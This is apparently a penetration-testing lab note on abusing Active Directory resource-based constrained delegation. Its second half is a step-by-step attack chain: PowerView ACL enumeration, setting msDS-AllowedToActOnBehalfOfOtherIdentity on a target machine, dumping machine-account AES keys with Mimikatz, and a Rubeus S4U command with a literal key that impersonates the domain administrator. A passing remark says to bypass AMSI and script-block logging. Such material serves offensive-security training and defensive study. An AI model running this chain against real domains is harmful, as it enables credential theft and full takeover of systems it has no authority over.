# Resource Based Constrained Delegation
In case of constrained delegation the delegation was configured on the front end server(the first hop) example: the websvc user or the web service server and delegation was controlled using msDS-AllowedToDelegate property and frontend server would delegate the credentials(ticket) to another server. In case of resource based constrained delegation the delegation authority is on the hands of resource administrator. Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor SID of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service. The service owner or administrator can configure this delegation like database administrator.

# Abuse
To abuse RBCD we can first configure it ourselves and then attack it. we need two privileges to abuse it.
- Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
- Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain -ms-DS-MachineAccountQuotais 10 for all domain users)

- First we need admin access on our initial machine then using powerview
```
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```
This would show user ciadmin has write permission(generic write) over dcorp-mgmt machine.

- Since ciadmin was compromised after we got access to dcorp-ci machine via jenkins reverse shell so access dcorp-ci machine bypass scriptblocklogging, amsi. Since this attack is based on first configuring it and abusing it

## Using AD module
Here, on dcorp-mgmt machine we are setting RBCD meaning PrincipalsAllowedToDelegateToAccount for dcorp-student1$ and dcorp-student2$ machines. This configuration means the dcorp-student1$ and dcorp-student2$ machine accounts can access any service on dcorp-mgmt machine as any user including a domain admin.

```
$comps = 'dcorp-student1$', 'dcorp-student2$'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```
## Using POwerView
```
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student1$'
```
```
Get-DomainRBCD
```
- After this we extract aes keys of dcorp-student1$ and dcorp-student2$ machines 
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
```
- Use the AES key of dcorp-student1$ or dcorp-student2$ machines with Rubeus and access dcorp-mgmtas ANY user we want:
```
Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```
```
winrs -r:dcorp-mgmt cmd.exe 
```